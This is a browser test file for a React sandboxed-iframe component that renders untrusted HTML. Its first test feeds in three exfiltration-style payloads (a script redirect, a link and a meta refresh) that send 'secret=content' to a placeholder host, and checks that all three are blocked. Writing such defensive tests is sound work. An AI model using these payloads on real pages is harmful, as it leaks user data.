import { createRoot } from "react-dom/client";
import { expect, it } from "vitest";
import { commands } from "vitest/browser";
import { HtmlRenderFrame } from "./HtmlRenderFrame";
import { buildHtmlRenderGuard } from "./HtmlRenderFrame.guard";

declare module "vitest/browser" {
  interface BrowserCommands {
    checkHtmlRenderNavigation: (
      document: string,
      clickLink: boolean,
    ) => Promise<{
      remainingFrames: number;
      requests: string[];
    }>;
  }
}

it.each([
  `<script>location.href='https://render-leak.invalid/script?secret=content'</script>`,
  `<a href="https://render-leak.invalid/link?secret=content">Leave</a>`,
  `<meta http-equiv="refresh" content="0;url=https://render-leak.invalid/refresh?secret=content">`,
])("blocks navigation before requests and hides the failed visual: %s", async (html) => {
  expect(
    await commands.checkHtmlRenderNavigation(buildHtmlRenderGuard(html), html.startsWith("<a")),
  ).toEqual({ remainingFrames: 0, requests: [] });
});

it("runs JavaScript without same-origin privileges and syncs theme changes", async () => {
  const host = document.createElement("div");
  document.body.append(host);
  const root = createRoot(host);
  const observations: Array<{ blocked: boolean; color: string }> = [];
  function receive(event: MessageEvent) {
    if (
      event.source === host.querySelector("iframe")?.contentWindow?.[0] &&
      event.data?.type === "render-test"
    )
      observations.push(event.data);
  }
  window.addEventListener("message", receive);
  const original = document.documentElement.style.getPropertyValue("--primary");
  document.documentElement.style.setProperty("--primary", "rgb(1, 2, 3)");
  try {
    root.render(
      <HtmlRenderFrame
        content={{
          title: "Sandbox",
          html: `<p>Sandbox</p><script>
       let blocked = false; try { void parent.document.body; } catch { blocked = true; }
      parent.postMessage({type:'securitypolicyviolation',effectiveDirective:'frame-src'}, '*');
      dispatchEvent(new SecurityPolicyViolationEvent('securitypolicyviolation', {effectiveDirective:'frame-src'}));
      function report() { parent.parent.postMessage({ type:'render-test', blocked, color:getComputedStyle(document.documentElement).getPropertyValue('--primary') }, '*'); }
      addEventListener('message', () => setTimeout(report, 0));
    </script>`,
        }}
      />,
    );
    await expect
      .poll(() => observations.some((value) => value.blocked && value.color === "rgb(1, 2, 3)"))
      .toBe(true);
    document.documentElement.style.setProperty("--primary", "rgb(4, 5, 6)");
    await expect
      .poll(() => observations.some((value) => value.blocked && value.color === "rgb(4, 5, 6)"))
      .toBe(true);
    expect(host.querySelector("iframe")?.getAttribute("sandbox")).toBe("allow-scripts");
  } finally {
    root.unmount();
    host.remove();
    window.removeEventListener("message", receive);
    document.documentElement.style.setProperty("--primary", original);
  }
});

it("loads actual bundled upright and italic DM Sans faces inside the sandbox", async () => {
  const host = document.createElement("div");
  document.body.append(host);
  const root = createRoot(host);
  let fonts: unknown;
  function receive(event: MessageEvent) {
    if (
      event.source === host.querySelector("iframe")?.contentWindow?.[0] &&
      event.data?.type === "font-test"
    )
      fonts = event.data.fonts;
  }
  window.addEventListener("message", receive);
  try {
    root.render(
      <HtmlRenderFrame
        content={{
          title: "Fonts",
          html: `<script>
      Promise.all([document.fonts.load('400 14px "DM Sans"'), document.fonts.load('italic 700 14px "DM Sans"')]).then(groups => {
        parent.parent.postMessage({type:'font-test', fonts:groups.map(faces => faces.map(face => ({family:face.family,status:face.status,style:face.style})))}, '*');
      });
    </script>`,
        }}
      />,
    );
    await expect
      .poll(() => fonts)
      .toEqual([
        [{ family: "DM Sans", status: "loaded", style: "normal" }],
        [{ family: "DM Sans", status: "loaded", style: "italic" }],
      ]);
  } finally {
    root.unmount();
    host.remove();
    window.removeEventListener("message", receive);
  }
});
